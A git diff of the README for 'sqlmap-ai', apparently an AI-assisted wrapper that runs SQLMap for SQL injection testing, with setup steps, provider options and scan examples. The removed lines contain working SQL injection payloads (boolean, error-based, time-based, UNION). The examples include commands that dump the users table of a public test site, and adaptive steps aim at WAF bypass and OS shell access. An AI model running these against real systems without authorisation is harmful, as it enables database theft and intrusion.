@@ -8,117 +8,253 @@ An AI-powered wrapper around SQLMap that makes SQL injection testing more access
 - Automated result analysis and next step suggestions
 - User-friendly output and reporting
 - **NEW: Adaptive step-by-step testing with DBMS-specific optimizations and WAF bypass**
+- **NEW: Ollama support for local AI analysis**
 
-## Requirements
+## Quick Start
 
-- Python 3.7+
-- SQLMap
-- Required Python packages (see requirements.txt)
+### Step 1: Install SQLMap AI
 
-## Installation
-
-1. Clone this repository:
 ```bash
+# Clone the repository
 git clone https://github.com/yourusername/sqlmap-ai.git
 cd sqlmap-ai
+
+# Install the package
+pip install -e .
+
+# Run installation check (sets up SQLMap and creates config files)
+sqlmap-ai --install-check
+
+pip install sqlmap-ai
 ```
 
-2. Install the required dependencies:
+### Step 2: Configure AI Providers
+
+Choose one or more AI providers to use:
+
+#### Option A: Groq (Recommended - Fastest)
+1. Get a free API key from [https://console.groq.com](https://console.groq.com)
+2. Add to your `.env` file:
 ```bash
-pip install -r requirements.txt
+GROQ_API_KEY=your_groq_api_key_here
 ```
 
-3. Make sure SQLMap is available in the `sqlmap` directory or add it:
+#### Option B: OpenAI
+1. Get an API key from [https://platform.openai.com](https://platform.openai.com)
+2. Add to your `.env` file:
 ```bash
-git clone https://github.com/sqlmapproject/sqlmap.git
+OPENAI_API_KEY=your_openai_api_key_here
 ```
 
-## Usage
+#### Option C: Anthropic (Claude)
+1. Get an API key from [https://console.anthropic.com](https://console.anthropic.com)
+2. Add to your `.env` file:
+```bash
+ANTHROPIC_API_KEY=your_anthropic_api_key_here
+```
 
-### Create Env
+#### Option D: Ollama (Local AI - Privacy Focused)
+1. Install Ollama: [https://ollama.ai/download](https://ollama.ai/download)
+2. Start Ollama service:
+```bash
+ollama serve
+```
+3. Download a model:
+```bash
+ollama pull llama3.2
+```
+4. Enable in your `.env` file:
+```bash
+ENABLE_OLLAMA=true
+OLLAMA_MODEL=llama3.2
+```
 
-Create a `.env` file in the root directory with the following variables:
+### Step 3: Run Configuration Wizard
 
 ```bash
-# Required
-GROQ_API_KEY=your_groq_api_key
+# Interactive setup
+sqlmap-ai --config-wizard
 ```
 
-You can get a Groq API key by signing up at [https://console.groq.com](https://console.groq.com).
+This will:
+- Check your AI provider setup
+- Let you select Ollama models (if using Ollama)
+- Configure security settings
+- Set up SQLMap options
 
-### Standard Mode
-
-Run the assistant in standard mode:
+### Step 4: Test Your Setup
 
 ```bash
-python run.py
+# Check if everything is working
+sqlmap-ai --check-providers
+
+# List available Ollama models (if using Ollama)
+sqlmap-ai --list-ollama-models
 ```
+
+## Usage Examples
+
+### Basic SQL Injection Test
+
+```bash
+# Test a vulnerable website
+sqlmap-ai -u "http://example.com/page.php?id=1"
+
+# Use specific AI provider
+sqlmap-ai -u "http://example.com/page.php?id=1" --ai-provider groq
+```
+
+### Advanced Testing
+
+```bash
+# Adaptive testing (recommended)
+sqlmap-ai --adaptive
+
+# Simple mode (basic SQLMap without AI)
+sqlmap-ai --simple -u "http://example.com/page.php?id=1"
+```
+
+### AI Provider Selection
+
+```bash
+# Use Groq (fastest)
+sqlmap-ai -u "http://example.com/page.php?id=1" --ai-provider groq
+
+# Use Ollama (local, private)
+sqlmap-ai -u "http://example.com/page.php?id=1" --ai-provider ollama
+
+# Use OpenAI
+sqlmap-ai -u "http://example.com/page.php?id=1" --ai-provider openai
+
+# Auto-select best available
+sqlmap-ai -u "http://example.com/page.php?id=1" --ai-provider auto
+```
+
+## AI Providers Comparison
+
+| Provider | Setup | Speed | Privacy | Cost |
+|----------|-------|-------|---------|------|
+| **Groq** | API Key | ⚡ Fastest | Cloud | Free tier available |
+| **OpenAI** | API Key | ⚡ Fast | Cloud | Pay per use |
+| **Anthropic** | API Key | ⚡ Fast | Cloud | Pay per use |
+| **Ollama** | Local install | Fast | 🔒 Local | Free |
+
+## Configuration Files
+
+### .env File
+Created automatically by `sqlmap-ai --install-check`:
+
+```bash
+# AI Provider API Keys
+GROQ_API_KEY=your_groq_api_key_here
+OPENAI_API_KEY=your_openai_api_key_here
+ANTHROPIC_API_KEY=your_anthropic_api_key_here
+
+# Ollama Settings (if using local AI)
+ENABLE_OLLAMA=false
+OLLAMA_BASE_URL=http://localhost:11434
+OLLAMA_MODEL=llama3.2
+
+# Security Settings
+MAX_REQUESTS_PER_MINUTE=60
+SAFE_MODE=true
+AUDIT_LOGGING=true
+```
+
+### config.yaml
+Created automatically by `sqlmap-ai --config-wizard`:
+
+```yaml
+version: "2.0"
+security:
+  safe_mode: true
+  max_requests_per_minute: 60
+  audit_logging: true
+
+sqlmap:
+  default_timeout: 120
+  default_risk: 1
+  default_level: 1
+  default_threads: 5
+
+ui:
+  show_banner: true
+  interactive_mode: false
+```
+
+## Troubleshooting
+
+### Common Issues
+
+**1. "No AI providers available"**
+- Check your `.env` file has correct API keys
+- Run `sqlmap-ai --check-providers` to verify
+
+**2. "Ollama not detected"**
+- Make sure Ollama is running: `ollama serve`
+- Check if models are installed: `ollama list`
+- Verify `.env` has `ENABLE_OLLAMA=true`
+
+**3. "SQLMap not found"**
+- Run `sqlmap-ai --install-check` to install SQLMap
+- Or install manually: `pip install sqlmap`
+
+**4. "Configuration issues"**
+- Run `sqlmap-ai --config-wizard` to fix setup
+- Check `sqlmap-ai --validate-config` for issues
+
+### Getting Help
+
+```bash
+# Show all available commands
+sqlmap-ai --help
+
+# Show enhanced mode help
+sqlmap-ai --enhanced --help
+
+# Show simple mode help
+sqlmap-ai --simple --help
+```
+
+## Advanced Features
 
 ### Adaptive Testing Mode
-
-Run the assistant in adaptive step-by-step testing mode:
-
-```bash
-python run.py --adaptive
-```
-
-The adaptive mode will:
-
-1. **Initial Target Assessment** - Check if the target is vulnerable to SQL injection
-2. **DBMS Identification** - Identify the database management system type
-3. **DBMS-Specific Optimization** - Tailored attack based on detected DBMS:
-   - MySQL: Extract databases and tables
-   - MSSQL: Try to gain OS shell access
-   - Oracle: Use specialized Oracle techniques
-   - PostgreSQL: Customized PostgreSQL attack vectors
-4. **Adaptive WAF Bypass** - Dynamically select tamper scripts based on WAF detection
-5. **Data Extraction** - Extract sensitive information from databases
-6. **Alternative Input Testing** - Test POST parameters, cookies, and headers
-
-## Examples
-
-![demo](./sqlmap.gif)
-
-### Testing a vulnerable web application
+Automatically adapts testing strategy based on target:
 
 ```bash
-python run.py --adaptive
-# Enter target URL: http://testphp.vulnweb.com/artists.php?artist=1
+sqlmap-ai --adaptive
 ```
 
-### Testing with increased timeout
+This mode:
+1. **Initial Assessment** - Check for SQL injection vulnerabilities
+2. **DBMS Identification** - Detect database type
+3. **DBMS-Specific Attacks** - Use optimized techniques
+4. **WAF Bypass** - Automatically select tamper scripts
+5. **Data Extraction** - Extract sensitive information
+6. **Alternative Testing** - Test POST, cookies, headers
+
+### Ollama Model Selection
+
+If using Ollama, you can select different models:
 
 ```bash
-python run.py --adaptive
-# Enter target URL: http://example.com/page.php?id=1
-# Enter timeout in seconds: 300
+# List available models
+sqlmap-ai --list-ollama-models
+
+# Interactive model selection
+sqlmap-ai --config-wizard
 ```
 
-### Example output
-```plaintext
-success: True
-partial: True
-message: Found databases but unable to enumerate tables. The database might be empty or protected.
-databases_found: ['acuart', 'information_schema']
+Popular models:
+- **llama3.2** - Good general performance
+- **codellama** - Specialized for code analysis
+- **mistral** - Fast and efficient
+- **qwen2.5** - Good reasoning capabilities
 
-Scan History:
-
-Step: initial_assessment
-Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --dbs --threads=5
-
-Step: dbms_specific_scan
-Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --dbms=mysql --tables --threads=5
-
-Step: high_risk_testing
-Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --risk=3 --level=5
-
-Step: high_risk_tables
-Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --tables --risk=3 --level=5
-```
-
+### Result:
 ```json
 {
-  "timestamp": 1743273810,
+  "timestamp": 1755896586,
   "scan_info": {
     "vulnerable_parameters": [
       "cat"
@@ -129,27 +265,19 @@ Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --
     "databases": [],
     "tables": [],
     "columns": {},
-    "dbms": "MySQL >= 8.0.0",
-    "os": "Linux Ubuntu",
+    "dbms": "back-end DBMS: MySQL >= 5.6",
+    "os": "Unknown",
     "waf_detected": false,
-    "web_app": [
-      "PHP 5.6.40",
-      "Nginx 1.19.0"
-    ],
-    "payloads": [
-      "cat=(SELECT (CASE WHEN (3918=3918) THEN 12 ELSE (SELECT 6516 UNION SELECT 1824) END))",
-      "cat=12 AND GTID_SUBSET(CONCAT(0x7176717071,(SELECT (ELT(3742=3742,1))),0x7162706b71),3742)",
-      "cat=12 AND (SELECT 2321 FROM (SELECT(SLEEP(5)))cKgu)",
-      "cat=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x4a61754b68596e4c74794e6b52544d4b506967536c4c534b6173646b6954724d676269494f697842,0x7162706b71),NULL-- -"
-    ],
-    "raw_result": "        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.9.3.4#dev}\n|_ -| . [(]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 19:43:25 /2025-03-29/\n\n[19:43:27] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: Boolean-based blind - Parameter replace (original value)\n    Payload: cat=(SELECT (CASE WHEN (3918=3918) THEN 12 ELSE (SELECT 6516 UNION SELECT 1824) END))\n\n    Type: error-based\n    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\n    Payload: cat=12 AND GTID_SUBSET(CONCAT(0x7176717071,(SELECT (ELT(3742=3742,1))),0x7162706b71),3742)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: cat=12 AND (SELECT 2321 FROM (SELECT(SLEEP(5)))cKgu)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x4a61754b68596e4c74794e6b52544d4b506967536c4c534b6173646b6954724d676269494f697842,0x7162706b71),NULL-- -\n---\n[19:43:28] [INFO] testing MySQL\n[19:43:28] [INFO] confirming MySQL\n[19:43:28] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: PHP 5.6.40, Nginx 1.19.0\nback-end DBMS: MySQL >= 8.0.0\n[19:43:28] [INFO] fetching tables for database: 'acuart'\nDatabase: acuart\n[8 tables]\n+-----------+\n| artists   |\n| carts     |\n| categ     |\n| featured  |\n| guestbook |\n| pictures  |\n| products  |\n| users     |\n+-----------+\n\n[*] ending @ 19:43:28 /2025-03-29/\n",
+    "web_app": [],
+    "payloads": [],
+    "raw_result": "[+] the following parameters are vulnerable to SQL injection:\n    Parameter: cat (GET)\n[+] back-end DBMS: back-end DBMS: MySQL >= 5.6\n[+] banner: 8.0.22-0ubuntu0.20.04.2",
     "url": "",
     "extracted": {}
   },
   "scan_history": [
     {
-      "step": "initial_assessment",
-      "command": "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --dbs --threads=5",
+      "step": "initial_reconnaissance",
+      "command": "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --fingerprint --dbs",
       "result": {
         "vulnerable_parameters": [
           "cat"
@@ -163,27 +291,19 @@ Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --
         ],
         "tables": [],
         "columns": {},
-        "dbms": "MySQL 8",
-        "os": "Linux Ubuntu",
+        "dbms": "back-end DBMS: MySQL >= 5.6",
+        "os": "Unknown",
         "waf_detected": false,
-        "web_app": [
-          "PHP 5.6.40",
-          "Nginx 1.19.0"
-        ],
-        "payloads": [
-          "cat=(SELECT (CASE WHEN (3918=3918) THEN 12 ELSE (SELECT 6516 UNION SELECT 1824) END))",
-          "cat=12 AND GTID_SUBSET(CONCAT(0x7176717071,(SELECT (ELT(3742=3742,1))),0x7162706b71),3742)",
-          "cat=12 AND (SELECT 2321 FROM (SELECT(SLEEP(5)))cKgu)",
-          "cat=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x4a61754b68596e4c74794e6b52544d4b506967536c4c534b6173646b6954724d676269494f697842,0x7162706b71),NULL-- -"
-        ],
-        "raw_result": "SQLMap output truncated for readability",
+        "web_app": [],
+        "payloads": [],
+        "raw_result": "[+] the following parameters are vulnerable to SQL injection:\n    Parameter: cat (GET)\n[+] back-end DBMS: back-end DBMS: MySQL >= 5.6\n[+] banner: 8.0.22-0ubuntu0.20.04.2\n[+] available databases [2]:\n[*] acuart\n[*] information_schema",
         "url": "",
         "extracted": {}
       }
     },
     {
-      "step": "dbms_specific_scan",
-      "command": "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --dbms=mysql --tables --threads=5",
+      "step": "follow_up_scan",
+      "command": "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 ['-D acuart --tables', '-D acuart --columns', '-D acuart -T users --dump']",
       "result": {
         "vulnerable_parameters": [
           "cat"
@@ -194,85 +314,12 @@ Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --
         "databases": [],
         "tables": [],
         "columns": {},
-        "dbms": "MySQL >= 8.0.0",
-        "os": "Linux Ubuntu",
+        "dbms": "back-end DBMS: MySQL >= 5.6",
+        "os": "Unknown",
         "waf_detected": false,
-        "web_app": [
-          "PHP 5.6.40",
-          "Nginx 1.19.0"
-        ],
-        "payloads": [
-          "cat=(SELECT (CASE WHEN (3918=3918) THEN 12 ELSE (SELECT 6516 UNION SELECT 1824) END))",
-          "cat=12 AND GTID_SUBSET(CONCAT(0x7176717071,(SELECT (ELT(3742=3742,1))),0x7162706b71),3742)",
-          "cat=12 AND (SELECT 2321 FROM (SELECT(SLEEP(5)))cKgu)",
-          "cat=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x4a61754b68596e4c74794e6b52544d4b506967536c4c534b6173646b6954724d676269494f697842,0x7162706b71),NULL-- -"
-        ],
-        "raw_result": "SQLMap output truncated for readability",
-        "url": "",
-        "extracted": {}
-      }
-    },
-    {
-      "step": "high_risk_testing",
-      "command": "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --risk=3 --level=5",
-      "result": {
-        "vulnerable_parameters": [
-          "cat"
-        ],
-        "techniques": [
-          "MySQL"
-        ],
-        "databases": [
-          "acuart",
-          "information_schema"
-        ],
-        "tables": [],
-        "columns": {},
-        "dbms": "MySQL >= 8.0.0",
-        "os": "Linux Ubuntu",
-        "waf_detected": false,
-        "web_app": [
-          "Nginx 1.19.0",
-          "PHP 5.6.40"
-        ],
-        "payloads": [
-          "cat=(SELECT (CASE WHEN (3918=3918) THEN 12 ELSE (SELECT 6516 UNION SELECT 1824) END))",
-          "cat=12 AND GTID_SUBSET(CONCAT(0x7176717071,(SELECT (ELT(3742=3742,1))),0x7162706b71),3742)",
-          "cat=12 AND (SELECT 2321 FROM (SELECT(SLEEP(5)))cKgu)",
-          "cat=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x4a61754b68596e4c74794e6b52544d4b506967536c4c534b6173646b6954724d676269494f697842,0x7162706b71),NULL-- -"
-        ],
-        "raw_result": "SQLMap output truncated for readability",
-        "url": "",
-        "extracted": {}
-      }
-    },
-    {
-      "step": "high_risk_tables",
-      "command": "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --tables --risk=3 --level=5",
-      "result": {
-        "vulnerable_parameters": [
-          "cat"
-        ],
-        "techniques": [
-          "MySQL"
-        ],
-        "databases": [],
-        "tables": [],
-        "columns": {},
-        "dbms": "MySQL >= 8.0.0",
-        "os": "Linux Ubuntu",
-        "waf_detected": false,
-        "web_app": [
-          "PHP 5.6.40",
-          "Nginx 1.19.0"
-        ],
-        "payloads": [
-          "cat=(SELECT (CASE WHEN (3918=3918) THEN 12 ELSE (SELECT 6516 UNION SELECT 1824) END))",
-          "cat=12 AND GTID_SUBSET(CONCAT(0x7176717071,(SELECT (ELT(3742=3742,1))),0x7162706b71),3742)",
-          "cat=12 AND (SELECT 2321 FROM (SELECT(SLEEP(5)))cKgu)",
-          "cat=12 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x4a61754b68596e4c74794e6b52544d4b506967536c4c534b6173646b6954724d676269494f697842,0x7162706b71),NULL-- -"
-        ],
-        "raw_result": "SQLMap output truncated for readability",
+        "web_app": [],
+        "payloads": [],
+        "raw_result": "[+] the following parameters are vulnerable to SQL injection:\n    Parameter: cat (GET)\n[+] back-end DBMS: back-end DBMS: MySQL >= 5.6\n[+] banner: 8.0.22-0ubuntu0.20.04.2",
         "url": "",
         "extracted": {}
       }
@@ -281,59 +328,21 @@ Command: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=12 --batch --
 }
 ```
 
-## Contributing
+## Requirements
 
-This project welcomes contributions from the community! Here are some ways you can help:
-
-### Areas for Improvement
-
-- **Additional DBMS Support**: Enhance support for less common database types
-- **Advanced WAF Bypass Techniques**: Implement more sophisticated WAF detection and bypass methods
-- **Reporting Enhancements**: Improve the report generation with more detailed analysis
-- **UI/UX Improvements**: Create a web interface or better command-line experience
-- **Custom Tamper Scripts**: Develop specialized tamper scripts for specific WAF types
-- **Documentation**: Improve documentation and add more examples
-- **Testing**: Add test cases and improve test coverage
-
-### How to Contribute
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes
-4. Commit your changes (`git commit -m 'Add some amazing feature'`)
-5. Push to the branch (`git push origin feature/amazing-feature`)
-6. Open a Pull Request
-
-### Development Setup
-
-To set up the development environment:
-
-```bash
-# Clone your fork
-git clone https://github.com/yourusername/sqlmap-ai.git
-cd sqlmap-ai
-
-# Set up virtual environment (recommended)
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies including development requirements
-pip install -r requirements.txt
-pip install -r requirements-dev.txt  # if available
+- Python 3.8+
+- SQLMap (installed automatically)
+- Internet connection (for cloud AI providers)
+- 2GB+ RAM (for Ollama local models)
 
 ## License
 
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Credits
-
-- SQLMap project: https://github.com/sqlmapproject/sqlmap
-- Groq API for AI-powered suggestions 
-```
+This project is licensed under the MIT License.
 
 ## Disclaimer
+
 This tool is intended for educational and ethical hacking purposes only. Always obtain permission before testing any system or application. The developers are not responsible for any misuse or damage caused by this tool.
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=atiilla/sqlmap-ai&type=Date)](https://www.star-history.com/#atiilla/sqlmap-ai&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=atiilla/sqlmap-ai&type=Date)](https://www.star-history.com/#atiilla/sqlmap-ai&Date) 
